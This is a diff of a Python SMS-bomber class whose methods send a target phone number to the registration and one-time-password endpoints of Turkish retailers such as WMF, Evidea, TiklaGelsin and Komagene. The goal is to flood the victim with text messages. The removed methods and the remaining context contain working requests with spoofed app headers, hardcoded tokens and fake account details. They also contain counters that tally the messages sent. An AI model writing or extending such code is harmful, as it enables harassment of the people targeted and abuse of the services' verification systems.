@@ -41,19 +41,6 @@ class SendSms():
             print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> KahveDünyası")
         
 
-    #wmf.com.tr
-    def Wmf(self):
-        try:
-            wmf = requests.post("https://www.wmf.com.tr/users/register/", data={"confirm": "true", "date_of_birth": "1956-03-01", "email": self.mail, "email_allowed": "true", "first_name": "Memati", "gender": "male", "last_name": "Bas", "password": "31ABC..abc31", "phone": f"0{self.phone}"}, timeout=6)
-            if wmf.status_code == 202:
-                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}Gönderildi! {self.phone} --> WMF")
-                self.adet += 1   
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> WMF")
-    
-    
     #bim
     def Bim(self):
         try:
@@ -66,22 +53,6 @@ class SendSms():
         except:
             print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> BIM")
 
-
-    #englishhome.com
-    def Englishhome(self):
-        try:
-            url = "https://www.englishhome.com:443/api/member/sendOtp"
-            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "*/*", "Referer": "https://www.englishhome.com/", "Content-Type": "application/json", "Origin": "https://www.englishhome.com", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Priority": "u=0", "Te": "trailers"}
-            json={"Phone": self.phone, "XID": ""}
-            r = requests.post(url, headers=headers, json=json, timeout=6)
-            if r.json()["isError"] == False:
-                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}Gönderildi! {self.phone} --> EnglishHome")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> EnglishHome")
-          
 
     #suiste.com
     def Suiste(self):
@@ -113,21 +84,6 @@ class SendSms():
             print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> KimGBIster")
             
     
-    #evidea.com
-    def Evidea(self):
-        try:
-            url = "https://www.evidea.com:443/users/register/"
-            headers = {"Content-Type": "multipart/form-data; boundary=fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi", "X-Project-Name": "undefined", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "tr-TR,tr;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.evidea.com/", "User-Agent": "Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0", "X-Csrftoken": "7NdJbWSYnOdm70YVLIyzmylZwWbqLFbtsrcCQdLAEbnx7a5Tq4njjS3gEElZxYps"}
-            data = f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n"
-            r = requests.post(url, headers=headers, data=data, timeout=6)      
-            if r.status_code == 202:
-                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}Gönderildi! {self.phone} --> Evidea")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> Evidea") 
-
 
     #345dijital.com
     def Ucdortbes(self):
@@ -143,22 +99,6 @@ class SendSms():
         except:
             print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}Gönderildi! {self.phone} --> 345Dijital")
             self.adet += 1
-
-
-    #tiklagelsin.com
-    def TiklaGelsin(self):
-        try:
-            url = "https://svc.apps.tiklagelsin.com:443/user/graphql"
-            headers = {"Content-Type": "application/json", "X-Merchant-Type": "0", "Accept": "*/*", "Appversion": "2.4.1", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate", "X-No-Auth": "true", "User-Agent": "TiklaGelsin/809 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Device-Type": "2"}
-            json={"operationName": "GENERATE_OTP", "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", "variables": {"challenge": "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68", "deviceUniqueId": "720932D5-47BD-46CD-A4B8-086EC49F81AB", "phone": f"+90{self.phone}"}}
-            r = requests.post(url, headers=headers, json=json, timeout=6)
-            if r.json()["data"]["generateOtp"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}Gönderildi! {self.phone} --> TıklaGelsin")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> TıklaGelsin")
 
 
     #naosstars.com
@@ -209,22 +149,6 @@ class SendSms():
             print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> Hayatsu")
 
 
-    #hizliecza.com.tr
-    def Hizliecza(self):
-        try:
-            url = "https://prod.hizliecza.net:443/mobil/account/sendOTP"
-            headers = {"Accept": "application/json", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate, br", "User-Agent": "hizliecza/31 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Accept-Language": "en-GB,en;q=0.9", "Authorization": "Bearer null"}
-            json={"otpOperationType": 1, "phoneNumber": f"+90{self.phone}"}
-            r = requests.post(url, headers=headers, json=json, timeout=6)
-            if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}Gönderildi! {self.phone} --> HızlıEcza")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> HızlıEcza")
-
-
     #metro-tr.com
     def Metro(self):
         try:
@@ -241,38 +165,6 @@ class SendSms():
             print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> MetroMarket")
 
 
-    #file.com.tr
-    def File(self):
-        try:
-            url = "https://api.filemarket.com.tr:443/v1/otp/send"
-            headers = {"Accept": "*/*", "Content-Type": "application/json", "User-Agent": "filemarket/2022060120013 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Os": "IOS", "X-Version": "1.7", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate"}
-            json={"mobilePhoneNumber": f"90{self.phone}"}
-            r = requests.post(url, headers=headers, json=json, timeout=6)
-            if r.json()["responseType"] == "SUCCESS":
-                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}Gönderildi! {self.phone} --> FileMarket")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> FileMarket")
-
-
-    #komagene.com.tr
-    def Komagene(self):
-        try:
-            url = "https://gateway.komagene.com.tr:443/auth/auth/smskodugonder"
-            json={"FirmaId": 32, "Telefon": self.phone}
-            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "*/*", "Accept-Encoding": "gzip, deflate, br", "Referer": "https://www.komagene.com.tr/", "Anonymousclientid": "0dbf392b-ab10-48b3-5cda-31f3c19816e6", "Firmaid": "32", "X-Guatamala-Kirsallari": "@@b7c5EAAAACwZI8p8fLJ8p6nOq9kTLL+0GQ1wCB4VzTQSq0sekKeEdAoQGZZo+7fQw+IYp38V0I/4JUhQQvrq1NPw4mHZm68xgkb/rmJ3y67lFK/uc+uq", "Content-Type": "application/json", "Origin": "https://www.komagene.com.tr", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
-            r = requests.post(url=url, headers=headers, json=json, timeout=6)
-            if r.json()["Success"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}Gönderildi! {self.phone} --> Komagene")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> Komagene")
-    
-    
     #porty.tech
     def Porty(self):
         try:
